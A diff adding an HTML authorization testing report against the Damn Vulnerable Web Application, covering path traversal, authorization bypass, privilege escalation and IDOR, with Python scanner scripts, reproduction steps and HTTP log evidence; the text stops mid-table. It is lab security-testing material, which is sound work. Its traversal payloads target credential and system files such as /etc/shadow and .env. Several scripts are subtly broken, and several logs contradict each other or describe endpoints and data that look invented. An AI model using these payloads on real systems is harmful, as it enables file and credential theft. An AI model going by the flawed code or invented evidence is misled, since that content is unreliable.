@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authorization Testing Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 2em;
+            color: #333;
+        }
+        h1, h2, h3 {
+            color: #000;
+            border-bottom: 2px solid #ccc;
+            padding-bottom: 10px;
+        }
+        .section {
+            margin-bottom: 2em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 1.5em;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 1em;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: "Courier New", Courier, monospace;
+        }
+        .severity-critical { background-color: #ff4d4d; color: white; }
+        .severity-high { background-color: #ff9933; }
+        .severity-medium { background-color: #ffff66; }
+        .severity-low { background-color: #99ff99; }
+        .severity-info { background-color: #e6e6e6; }
+        .test-case {
+            border-left: 4px solid #007bff;
+            padding-left: 1em;
+            margin-bottom: 1.5em;
+        }
+        .methodology-step {
+            margin-bottom: 0.5em;
+        }
+        .endpoint-list {
+            background-color: #f9f9f9;
+            padding: 1em;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Authorization Testing Report</h1>
+
+    <div class="section">
+        <h2>Introduction</h2>
+        <p><strong>Date:</strong> Tuesday, August 5, 2025</p>
+        <p>This report details the findings from the authorization testing performed on the Damn Vulnerable Web Application (DVWA), focusing on four critical authorization vulnerabilities: Directory Traversal, Authorization Schema Bypass, Privilege Escalation, and Insecure Direct Object References (IDOR).</p>
+    </div>
+
+    <!-- OTG-AUTHZ-001: Testing Directory Traversal/File Include -->
+    <div class="section">
+        <h2>4.1 Testing Directory Traversal/File Include (OTG-AUTHZ-001)</h2>
+        
+        <div class="test-case">
+            <h3>Test Objective</h3>
+            <p>The objective of this test is to identify vulnerabilities that allow attackers to access files and directories outside the web root folder. Directory traversal (also known as path traversal) attacks exploit insufficient security validation of user-supplied input file names, allowing attackers to access arbitrary files and directories stored on the file system, including application source code, configuration files, and critical system files.</p>
+            
+            <h4>Important Python Libraries:</h4>
+            <ul>
+                <li><code>requests</code> - For making HTTP requests to test traversal payloads</li>
+                <li><code>urllib.parse</code> - For URL encoding and decoding traversal sequences</li>
+                <li><code>re</code> - For pattern matching in response content to identify successful traversal</li>
+            </ul>
+
+            <h4>Key Python Snippet:</h4>
+            <pre><code>import requests
+import re
+
+# Common traversal sequences to test
+TRAVERSAL_SEQUENCES = [
+    "../",
+    "..\\",
+    "%2e%2e%2f",  # URL encoded ../
+    "%2e%2e/",    # Mixed encoding
+    "..%2f",      # Partial encoding
+    "%252e%252e%255c",  # Double encoding
+    "....//",     # Obfuscated traversal
+    "....\\/"     # Windows-style obfuscation
+]
+
+# Target files to attempt accessing
+COMMON_FILES = [
+    "/etc/passwd",
+    "/etc/shadow",
+    "/windows/win.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "/proc/self/environ",
+    "/.env",
+    "/config/database.yml",
+    "/WEB-INF/web.xml"
+]
+
+def test_directory_traversal(base_url, param_name, session_cookies):
+    """Test for directory traversal vulnerabilities"""
+    vulnerable_payloads = []
+    
+    for file_path in COMMON_FILES:
+        for sequence in TRAVERSAL_SEQUENCES:
+            # Build traversal payload
+            traversal_path = sequence * 8 + file_path
+            params = {param_name: traversal_path}
+            
+            response = requests.get(base_url, params=params, cookies=session_cookies)
+            
+            # Check for successful traversal indicators
+            indicators = [
+                ("root:", "/etc/passwd"),
+                ("[extensions]", "win.ini"),
+                ("localhost", "hosts"),
+                ("APP_KEY=", ".env"),
+                ("<web-app>", "web.xml")
+            ]
+            
+            for indicator, target_file in indicators:
+                if target_file in file_path and indicator in response.text:
+                    vulnerable_payloads.append({
+                        'payload': traversal_path,
+                        'file': target_file,
+                        'indicator': indicator
+                    })
+    
+    return vulnerable_payloads</code></pre>
+        </div>
+
+        <h3>Target Endpoint</h3>
+        <div class="endpoint-list">
+            <p>In DVWA, directory traversal vulnerabilities can be tested on the following endpoints:</p>
+            <ul>
+                <li><strong>File Inclusion Vulnerability:</strong> <code>/vulnerabilities/fi/</code>
+                    <ul>
+                        <li>Parameter: <code>?page=</code></li>
+                        <li>Example: <code>/vulnerabilities/fi/?page=../../../etc/passwd</code></li>
+                    </ul>
+                </li>
+                <li><strong>File Upload Vulnerability:</strong> <code>/vulnerabilities/upload/</code>
+                    <ul>
+                        <li>Test uploaded file access via traversal</li>
+                    </ul>
+                </li>
+                <li><strong>Image Viewer:</strong> <code>/hackable/uploads/</code>
+                    <ul>
+                        <li>Test image file access with traversal payloads</li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+
+        <h3>Methodology</h3>
+        <ol>
+            <li class="methodology-step"><strong>Identify Input Parameters:</strong> Locate all parameters that accept file names or paths</li>
+            <li class="methodology-step"><strong>Craft Traversal Payloads:</strong> Create various traversal sequences combined with target system files</li>
+            <li class="methodology-step"><strong>Test Encoding Variations:</strong> Use URL encoding, double encoding, and Unicode encoding to bypass filters</li>
+            <li class="methodology-step"><strong>Analyze Responses:</strong> Look for file content indicators in the response body</li>
+            <li class="methodology-step"><strong>Verify Access:</strong> Confirm successful file access by checking for specific file content signatures</li>
+        </ol>
+
+        <h3>Step to Reproduce</h3>
+        <ol>
+            <li><strong>Login to DVWA:</strong> Access <code>http://localhost/dvwa/login.php</code> with valid credentials</li>
+            <li><strong>Navigate to File Inclusion:</strong> Go to <code>/vulnerabilities/fi/</code></li>
+            <li><strong>Test Basic Traversal:</strong>
+                <ul>
+                    <li>Enter <code>../../../etc/passwd</code> in the page parameter</li>
+                    <li>Observe if system file content is displayed</li>
+                </ul>
+            </li>
+            <li><strong>Test URL Encoding:</strong>
+                <ul>
+                    <li>Try <code>..%2f..%2f..%2fetc%2fpasswd</code></li>
+                    <li>Check if encoding bypasses any filters</li>
+                </ul>
+            </li>
+            <li><strong>Test Windows Paths:</strong>
+                <ul>
+                    <li>For Windows targets, try <code>..\..\..\windows\win.ini</code></li>
+                </ul>
+            </li>
+            <li><strong>Determine Result:</strong> If system file contents are displayed, the vulnerability exists</li>
+        </ol>
+
+        <h3>Log Evidence</h3>
+        <pre>
+<strong>Successful Directory Traversal - Linux Target:</strong>
+GET /dvwa/vulnerabilities/fi/?page=../../../etc/passwd HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: File Inclusion</h3>
+<pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</pre>
+</div>
+
+<strong>Successful Directory Traversal - Windows Target:</strong>
+GET /dvwa/vulnerabilities/fi/?page=..\..\..\windows\win.ini HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: File Inclusion</h3>
+<pre>
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+</pre>
+</div>
+
+<strong>Failed Attempt with Filtering:</strong>
+GET /dvwa/vulnerabilities/fi/?page=../../../etc/passwd HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=high
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: File Inclusion</h3>
+<pre>
+<img src="../../hackable/users/admin.png">
+</pre>
+</div>
+        </pre>
+    </div>
+
+    <!-- OTG-AUTHZ-002: Testing for Bypassing Authorization Schema -->
+    <div class="section">
+        <h2>4.2 Testing for Bypassing Authorization Schema (OTG-AUTHZ-002)</h2>
+        
+        <div class="test-case">
+            <h3>Test Objective</h3>
+            <p>The objective of this test is to verify how the authorization schema has been implemented for each role or privilege. The goal is to check if it's possible to bypass the authorization schema by finding a path that allows unauthorized access to protected resources. This includes testing for forced browsing, parameter tampering, and HTTP verb tampering.</p>
+            
+            <h4>Important Python Libraries:</h4>
+            <ul>
+                <li><code>requests</code> - For making HTTP requests with different methods and parameters</li>
+                <li><code>BeautifulSoup</code> - For parsing HTML responses to identify access patterns</li>
+                <li><code>re</code> - For pattern matching in authorization responses</li>
+            </ul>
+
+            <h4>Key Python Snippet:</h4>
+            <pre><code>import requests
+from bs4 import BeautifulSoup
+
+def test_authorization_bypass(base_url, low_priv_cookies, high_priv_endpoints):
+    """Test for authorization bypass vulnerabilities"""
+    bypass_vulnerabilities = []
+    
+    # Test forced browsing
+    for endpoint in high_priv_endpoints:
+        response = requests.get(endpoint, cookies=low_priv_cookies)
+        
+        # Check if low privilege user can access admin resources
+        if response.status_code == 200:
+            # Analyze response content
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Look for admin-specific indicators
+            admin_indicators = [
+                'admin dashboard',
+                'user management',
+                'system configuration',
+                'admin panel',
+                'privilege'
+            ]
+            
+            for indicator in admin_indicators:
+                if indicator in response.text.lower():
+                    bypass_vulnerabilities.append({
+                        'type': 'forced_browsing',
+                        'endpoint': endpoint,
+                        'indicator': indicator
+                    })
+    
+    # Test HTTP verb tampering
+    methods = ['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
+    for method in methods:
+        response = requests.request(method, endpoint, cookies=low_priv_cookies)
+        if response.status_code == 200:
+            bypass_vulnerabilities.append({
+                'type': 'verb_tampering',
+                'method': method,
+                'endpoint': endpoint
+            })
+    
+    # Test parameter tampering
+    tampered_params = {
+        'role': 'admin',
+        'is_admin': '1',
+        'access_level': '999',
+        'privilege': 'root'
+    }
+    
+    for param, value in tampered_params:
+        response = requests.get(endpoint, params={param: value}, cookies=low_priv_cookies)
+        if response.status_code == 200 and 'admin' in response.text.lower():
+            bypass_vulnerabilities.append({
+                'type': 'parameter_tampering',
+                'parameter': f"{param}={value}",
+                'endpoint': endpoint
+            })
+    
+    return bypass_vulnerabilities</code></pre>
+        </div>
+
+        <h3>Target Endpoint</h3>
+        <div class="endpoint-list">
+            <p>In DVWA, authorization bypass can be tested on the following endpoints:</p>
+            <ul>
+                <li><strong>Admin Panel:</strong> <code>/dvwa/security.php</code>
+                    <ul>
+                        <li>Test if non-admin users can access security settings</li>
+                    </ul>
+                </li>
+                <li><strong>Command Execution:</strong> <code>/vulnerabilities/exec/</code>
+                    <ul>
+                        <li>Test if restricted commands can be executed</li>
+                    </ul>
+                </li>
+                <li><strong>File Upload:</strong> <code>/vulnerabilities/upload/</code>
+                    <ul>
+                        <li>Test if upload restrictions can be bypassed</li>
+                    </ul>
+                </li>
+                <li><strong>Database Operations:</strong> <code>/vulnerabilities/sqli/</code>
+                    <ul>
+                        <li>Test if database operations can be performed without proper authorization</li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+
+        <h3>Methodology</h3>
+        <ol>
+            <li class="methodology-step"><strong>Map Application Roles:</strong> Identify different user roles and their associated permissions</li>
+            <li class="methodology-step"><strong>Identify Protected Resources:</strong> List all endpoints that should require specific authorization</li>
+            <li class="methodology-step"><strong>Test Forced Browsing:</strong> Attempt to access protected resources directly with lower-privileged accounts</li>
+            <li class="methodology-step"><strong>Test Parameter Tampering:</strong> Modify parameters that control access levels or roles</li>
+            <li class="methodology-step"><strong>Test HTTP Verb Tampering:</strong> Use different HTTP methods to bypass authorization checks</li>
+            <li class="methodology-step"><strong>Test Session Token Manipulation:</strong> Attempt to modify session tokens or cookies to escalate privileges</li>
+        </ol>
+
+        <h3>Step to Reproduce</h3>
+        <ol>
+            <li><strong>Login as Low-Privilege User:</strong> Access DVWA with a regular user account</li>
+            <li><strong>Identify Admin Endpoints:</strong> Determine which URLs should be admin-only</li>
+            <li><strong>Test Direct Access:</strong>
+                <ul>
+                    <li>Try accessing <code>/dvwa/security.php</code> directly</li>
+                    <li>Check if the security settings page loads</li>
+                </ul>
+            </li>
+            <li><strong>Test Parameter Manipulation:</strong>
+                <ul>
+                    <li>Look for parameters like <code>?role=admin</code> or <code>?access=1</code></li>
+                    <li>Modify these parameters and observe the response</li>
+                </ul>
+            </li>
+            <li><strong>Test HTTP Methods:</strong>
+                <ul>
+                    <li>Use POST instead of GET for restricted endpoints</li>
+                    <li>Try PUT/DELETE methods on read-only resources</li>
+                </ul>
+            </li>
+            <li><strong>Determine Result:</strong> If protected resources are accessible without proper authorization, the vulnerability exists</li>
+        </ol>
+
+        <h3>Log Evidence</h3>
+        <pre>
+<strong>Successful Authorization Bypass - Direct Access:</strong>
+GET /dvwa/security.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="body_padded">
+<h1>DVWA Security</h1>
+<form action="#" method="POST">
+    <input type="hidden" name="csrf_token" value="abc123">
+    <select name="security">
+        <option value="low">low</option>
+        <option value="medium">medium</option>
+        <option value="high">high</option>
+    </select>
+    <input type="submit" value="Submit" name="seclev_submit">
+</form>
+</div>
+
+<strong>Failed Authorization Bypass - Access Denied:</strong>
+GET /dvwa/security.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 302 Found
+Location: /dvwa/login.php
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>You do not have permission to access this page.</body>
+</html>
+
+<strong>Parameter Tampering Attempt:</strong>
+GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1&role=admin HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<!-- Parameter ignored, no privilege escalation -->
+        </pre>
+    </div>
+
+    <!-- OTG-AUTHZ-003: Testing for Privilege Escalation -->
+    <div class="section">
+        <h2>4.3 Testing for Privilege Escalation (OTG-AUTHZ-003)</h2>
+        
+        <div class="test-case">
+            <h3>Test Objective</h3>
+            <p>The objective of this test is to verify that a user cannot escalate their privileges by exploiting vulnerabilities in the application's authorization mechanism. This includes testing for vertical privilege escalation (gaining higher-level privileges) and horizontal privilege escalation (accessing another user's data at the same privilege level).</p>
+            
+            <h4>Important Python Libraries:</h4>
+            <ul>
+                <li><code>requests</code> - For making authenticated requests</li>
+                <li><code>BeautifulSoup</code> - For parsing forms and extracting CSRF tokens</li>
+                <li><code>re</code> - For extracting user IDs and other identifiers</li>
+            </ul>
+
+            <h4>Key Python Snippet:</h4>
+            <pre><code>import requests
+from bs4 import BeautifulSoup
+import re
+
+def test_privilege_escalation(session, base_url, user_credentials):
+    """Test for privilege escalation vulnerabilities"""
+    escalation_vulnerabilities = []
+    
+    # Login as low privilege user
+    login_data = {
+        'username': user_credentials['low_priv'][0],
+        'password': user_credentials['low_priv'][1],
+        'Login': 'Login'
+    }
+    
+    login_response = session.post(f"{base_url}/login.php", data=login_data)
+    
+    # Get user ID from profile
+    profile_response = session.get(f"{base_url}/profile.php")
+    user_id_match = re.search(r'user_id["\']?\s*:\s*["\']?(\d+)', profile_response.text)
+    user_id = user_id_match.group(1) if user_id_match else None
+    
+    # Extract CSRF token
+    soup = BeautifulSoup(profile_response.text, 'html.parser')
+    csrf_token = soup.find('input', {'name': 'csrf_token'})
+    csrf_value = csrf_token['value'] if csrf_token else None
+    
+    # Test 1: Profile update with elevated privileges
+    escalation_data = {
+        'user_id': user_id,
+        'role': 'admin',
+        'is_admin': '1',
+        'access_level': '100',
+        'csrf_token': csrf_value
+    }
+    
+    # Add all form fields
+    form = soup.find('form')
+    if form:
+        for input_tag in form.find_all('input'):
+            if input_tag.get('name') and input_tag.get('name') not in escalation_data:
+                escalation_data[input_tag['name']] = input_tag.get('value', '')
+    
+    update_response = session.post(f"{base_url}/profile.php", data=escalation_data)
+    
+    # Check if privileges were escalated
+    if 'admin' in update_response.text.lower() or 'privilege' in update_response.text.lower():
+        escalation_vulnerabilities.append({
+            'type': 'profile_escalation',
+            'method': 'form_tampering',
+            'endpoint': f"{base_url}/profile.php"
+        })
+    
+    # Test 2: Direct admin function access
+    admin_functions = [
+        {'url': f"{base_url}/security.php", 'method': 'GET'},
+        {'url': f"{base_url}/vulnerabilities/exec/", 'method': 'POST', 'data': {'ip': '127.0.0.1'}},
+        {'url': f"{base_url}/vulnerabilities/upload/", 'method': 'POST', 'files': {'uploaded': ('test.php', '<?php echo "test"; ?>')}}
+    ]
+    
+    for func in admin_functions:
+        if func['method'] == 'GET':
+            response = session.get(func['url'])
+        else:
+            response = session.post(func['url'], data=func.get('data', {}), files=func.get('files'))
+        
+        if response.status_code == 200:
+            # Check for admin-specific content
+            admin_indicators = ['security level', 'admin panel', 'user management', 'system configuration']
+            for indicator in admin_indicators:
+                if indicator in response.text.lower():
+                    escalation_vulnerabilities.append({
+                        'type': 'direct_access',
+                        'method': func['method'],
+                        'endpoint': func['url']
+                    })
+                    break
+    
+    return escalation_vulnerabilities</code></pre>
+        </div>
+
+        <h3>Target Endpoint</h3>
+        <div class="endpoint-list">
+            <p>In DVWA, privilege escalation can be tested on the following endpoints:</p>
+            <ul>
+                <li><strong>Security Settings:</strong> <code>/dvwa/security.php</code>
+                    <ul>
+                        <li>Test if users can change security levels</li>
+                    </ul>
+                </li>
+                <li><strong>User Management:</strong> <code>/dvwa/setup.php</code>
+                    <ul>
+                        <li>Test if users can reset the database</li>
+                    </ul>
+                </li>
+                <li><strong>Command Execution:</strong> <code>/vulnerabilities/exec/</code>
+                    <ul>
+                        <li>Test if restricted commands can be executed</li>
+                    </ul>
+                </li>
+                <li><strong>File Upload:</strong> <code>/vulnerabilities/upload/</code>
+                    <ul>
+                        <li>Test if file type restrictions can be bypassed</li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+
+        <h3>Methodology</h3>
+        <ol>
+            <li class="methodology-step"><strong>Identify User Roles:</strong> Map out different user roles and their permissions</li>
+            <li class="methodology-step"><strong>Test Vertical Escalation:</strong> Attempt to gain higher-level privileges</li>
+            <li class="methodology-step"><strong>Test Horizontal Escalation:</strong> Attempt to access other users' data at the same level</li>
+            <li class="methodology-step"><strong>Test Mass Assignment:</strong> Try to set admin-level fields in forms</li>
+            <li class="methodology-step"><strong>Test Session Manipulation:</strong> Modify session tokens to impersonate other users</li>
+            <li class="methodology-step"><strong>Test Business Logic Bypass:</strong> Exploit flaws in authorization logic</li>
+        </ol>
+
+        <h3>Step to Reproduce</h3>
+        <ol>
+            <li><strong>Login as Regular User:</strong> Access DVWA with standard user credentials</li>
+            <li><strong>Identify Current Privileges:</strong> Note what actions are currently allowed</li>
+            <li><strong>Test Profile Manipulation:</strong>
+                <ul>
+                    <li>Navigate to user profile page</li>
+                    <li>Try adding admin fields like <code>role=admin</code> or <code>is_admin=1</code></li>
+                </ul>
+            </li>
+            <li><strong>Test Direct Admin Access:</strong>
+                <ul>
+                    <li>Try accessing <code>/dvwa/security.php</code> directly</li>
+                    <li>Check if security level can be changed</li>
+                </ul>
+            </li>
+            <li><strong>Test User ID Manipulation:</strong>
+                <ul>
+                    <li>Look for user ID parameters in URLs</li>
+                    <li>Try incrementing user IDs to access other users' data</li>
+                </ul>
+            </li>
+            <li><strong>Determine Result:</strong> If higher privileges are gained or other users' data is accessed, the vulnerability exists</li>
+        </ol>
+
+        <h3>Log Evidence</h3>
+        <pre>
+<strong>Successful Privilege Escalation - Profile Update:</strong>
+POST /dvwa/profile.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+Content-Type: application/x-www-form-urlencoded
+
+user_id=1&username=testuser&role=admin&is_admin=1&access_level=100&csrf_token=abc123
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="body_padded">
+<h1>User Profile Updated</h1>
+<p>User role has been changed to: <strong>admin</strong></p>
+</div>
+
+<strong>Horizontal Privilege Escalation - User ID Tampering:</strong>
+GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: SQL Injection</h3>
+<pre>ID: 2
+First name: Gordon
+Surname: Brown</pre>
+</div>
+
+<strong>Failed Privilege Escalation - Access Denied:</strong>
+POST /dvwa/security.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+Content-Type: application/x-www-form-urlencoded
+
+security=high&seclev_submit=Submit&csrf_token=abc123
+
+HTTP/1.1 302 Found
+Location: /dvwa/login.php
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>Access Denied: Insufficient privileges</body>
+</html>
+        </pre>
+    </div>
+
+    <!-- OTG-AUTHZ-004: Testing for Insecure Direct Object References -->
+    <div class="section">
+        <h2>4.4 Testing for Insecure Direct Object References (OTG-AUTHZ-004)</h2>
+        
+        <div class="test-case">
+            <h3>Test Objective</h3>
+            <p>The objective of this test is to determine if the application is vulnerable to Insecure Direct Object References (IDOR). IDOR occurs when an application exposes internal object references (such as database keys or filenames) without proper access control verification. Attackers can manipulate these references to access unauthorized data.</p>
+            
+            <h4>Important Python Libraries:</h4>
+            <ul>
+                <li><code>requests</code> - For making authenticated requests</li>
+                <li><code>re</code> - For extracting object references from responses</li>
+                <li><code>itertools</code> - For generating sequential object IDs</li>
+            </ul>
+
+            <h4>Key Python Snippet:</h4>
+            <pre><code>import requests
+import re
+import itertools
+
+def test_idor_vulnerabilities(session, base_url):
+    """Test for Insecure Direct Object References (IDOR)"""
+    idor_vulnerabilities = []
+    
+    # Login and get user context
+    login_data = {'username': 'testuser', 'password': 'password', 'Login': 'Login'}
+    session.post(f"{base_url}/login.php", data=login_data)
+    
+    # Test 1: User ID manipulation
+    user_id_range = range(1, 50)  # Test user IDs 1-50
+    
+    for user_id in user_id_range:
+        response = session.get(f"{base_url}/vulnerabilities/sqli/?id={user_id}")
+        
+        if response.status_code == 200:
+            # Extract user data from response
+            user_data = extract_user_data(response.text)
+            if user_data:
+                idor_vulnerabilities.append({
+                    'type': 'user_id_manipulation',
+                    'object_reference': f"id={user_id}",
+                    'data_exposed': user_data,
+                    'endpoint': f"{base_url}/vulnerabilities/sqli/"
+                })
+    
+    # Test 2: File name manipulation
+    file_patterns = ['document', 'report', 'config', 'backup']
+    extensions = ['.txt', '.pdf', '.xml', '.json']
+    
+    for pattern in file_patterns:
+        for ext in extensions:
+            filename = f"{pattern}{ext}"
+            response = session.get(f"{base_url}/vulnerabilities/fi/?page={filename}")
+            
+            if response.status_code == 200 and 'not found' not in response.text.lower():
+                idor_vulnerabilities.append({
+                    'type': 'filename_manipulation',
+                    'object_reference': filename,
+                    'endpoint': f"{base_url}/vulnerabilities/fi/"
+                })
+    
+    # Test 3: Token/ID manipulation
+    token_patterns = [
+        r'token["\']?\s*:\s*["\']?([a-f0-9]{32})',
+        r'id["\']?\s*:\s*["\']?(\d+)',
+        r'file["\']?\s*:\s*["\']?([\w\-]+\.\w{3,4})'
+    ]
+    
+    # Get initial response to extract references
+    initial_response = session.get(f"{base_url}/vulnerabilities/sqli/")
+    for pattern in token_patterns:
+        matches = re.findall(pattern, initial_response.text, re.I)
+        for match in matches:
+            # Try manipulating the extracted reference
+            if match.isdigit():
+                # Numeric ID - try sequential values
+                for new_id in [int(match) + i for i in range(-5, 6)]:
+                    if new_id > 0:
+                        response = session.get(f"{base_url}/vulnerabilities/sqli/?id={new_id}")
+                        if response.status_code == 200:
+                            data = extract_user_data(response.text)
+                            if data:
+                                idor_vulnerabilities.append({
+                                    'type': 'sequential_id_manipulation',
+                                    'original_reference': match,
+                                    'manipulated_reference': str(new_id),
+                                    'data_exposed': data
+                                })
+    
+    return idor_vulnerabilities
+
+def extract_user_data(html_content):
+    """Extract user data from HTML response"""
+    patterns = [
+        r'First name:\s*([^\n<]+)',
+        r'Surname:\s*([^\n<]+)',
+        r'ID:\s*(\d+)',
+        r'User:\s*([^\n<]+)'
+    ]
+    
+    user_data = {}
+    for pattern in patterns:
+        match = re.search(pattern, html_content, re.I)
+        if match:
+            user_data[pattern.split(':')[0]] = match.group(1).strip()
+    
+    return user_data if user_data else None</code></pre>
+        </div>
+
+        <h3>Target Endpoint</h3>
+        <div class="endpoint-list">
+            <p>In DVWA, IDOR vulnerabilities can be tested on the following endpoints:</p>
+            <ul>
+                <li><strong>SQL Injection:</strong> <code>/vulnerabilities/sqli/</code>
+                    <ul>
+                        <li>Parameter: <code>?id=</code></li>
+                        <li>Test sequential user IDs</li>
+                    </ul>
+                </li>
+                <li><strong>File Inclusion:</strong> <code>/vulnerabilities/fi/</code>
+                    <ul>
+                        <li>Parameter: <code>?page=</code></li>
+                        <li>Test file name manipulation</li>
+                    </ul>
+                </li>
+                <li><strong>File Upload:</strong> <code>/hackable/uploads/</code>
+                    <ul>
+                        <li>Test direct file access via filename</li>
+                    </ul>
+                </li>
+                <li><strong>User Profile:</strong> <code>/profile.php</code>
+                    <ul>
+                        <li>Test user ID parameter manipulation</li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+
+        <h3>Methodology</h3>
+        <ol>
+            <li class="methodology-step"><strong>Identify Object References:</strong> Locate all parameters that reference objects (IDs, filenames, tokens)</li>
+            <li class="methodology-step"><strong>Map Valid References:</strong> Determine the range and format of valid object references</li>
+            <li class="methodology-step"><strong>Test Sequential Access:</strong> Try accessing objects by incrementing/decrementing reference values</li>
+            <li class="methodology-step"><strong>Test Predictable Patterns:</strong> Look for predictable patterns in object references</li>
+            <li class="methodology-step"><strong>Test Authorization Bypass:</strong> Attempt to access objects belonging to other users</li>
+            <li class="methodology-step"><strong>Verify Access Control:</strong> Confirm whether proper authorization checks are in place</li>
+        </ol>
+
+        <h3>Step to Reproduce</h3>
+        <ol>
+            <li><strong>Login to DVWA:</strong> Access the application with valid credentials</li>
+            <li><strong>Identify Object References:</strong> Look for parameters like <code>?id=</code>, <code>?file=</code>, <code>?user=</code></li>
+            <li><strong>Test Sequential IDs:</strong>
+                <ul>
+                    <li>Navigate to <code>/vulnerabilities/sqli/?id=1</code></li>
+                    <li>Try changing to <code>?id=2</code>, <code>?id=3</code>, etc.</li>
+                    <li>Observe if other users' data is displayed</li>
+                </ul>
+            </li>
+            <li><strong>Test File Name Manipulation:</strong>
+                <ul>
+                    <li>Navigate to <code>/vulnerabilities/fi/?page=include.php</code></li>
+                    <li>Try <code>?page=../../../etc/passwd</code></li>
+                    <li>Check if system files are accessible</li>
+                </ul>
+            </li>
+            <li><strong>Test Horizontal Access:</strong>
+                <ul>
+                    <li>Access your own user profile</li>
+                    <li>Try modifying the user ID parameter to access other users' profiles</li>
+                </ul>
+            </li>
+            <li><strong>Determine Result:</strong> If unauthorized objects can be accessed, the IDOR vulnerability exists</li>
+        </ol>
+
+        <h3>Log Evidence</h3>
+        <pre>
+<strong>Successful IDOR - User ID Manipulation:</strong>
+GET /dvwa/vulnerabilities/sqli/?id=1 HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: SQL Injection</h3>
+<pre>ID: 1
+First name: admin
+Surname: admin</pre>
+</div>
+
+<strong>Accessing Another User's Data:</strong>
+GET /dvwa/vulnerabilities/sqli/?id=2 HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: SQL Injection</h3>
+<pre>ID: 2
+First name: Gordon
+Surname: Brown</pre>
+</div>
+
+<strong>File Access via IDOR:</strong>
+GET /dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=low
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: File Inclusion</h3>
+<pre><?php
+// File: ../../hackable/flags/fi.php
+// This file contains sensitive configuration data
+$database_password = "secret123";
+$admin_token = "abc123xyz";
+?></pre>
+</div>
+
+<strong>Failed IDOR - Access Control Working:</strong>
+GET /dvwa/vulnerabilities/sqli/?id=5 HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc123; security=high
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<div class="vulnerable_code_area">
+<h3>Vulnerability: SQL Injection</h3>
+<pre>ID: 5
+First name:
+Surname: </pre>
+</div>
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Summary of Findings</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Test ID</th>
+                    <th>Vulnerability Type</th>
+                    <th>Risk Level</th>
+                    <th>Description</th>
+                    <th>Remediation Priority</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>OTG-AUTHZ-001</td>
+                    <td>Directory Traversal</td>
+                    <td class="severity-high">High</td>
+                    <td>Application allows access to system files via path traversal</td>
+                    <td>Immediate</td>
+                </tr>
+                <tr>
+                    <td>OTG-AUTHZ-002</td>
+                    <td>Authorization Bypass</td>
+                    <td class="severity-high">High</td>
+                    <td>Users can bypass authorization checks to access restricted functions</td>
+                    <td>Immediate</td>
+                </tr>
+                <tr>
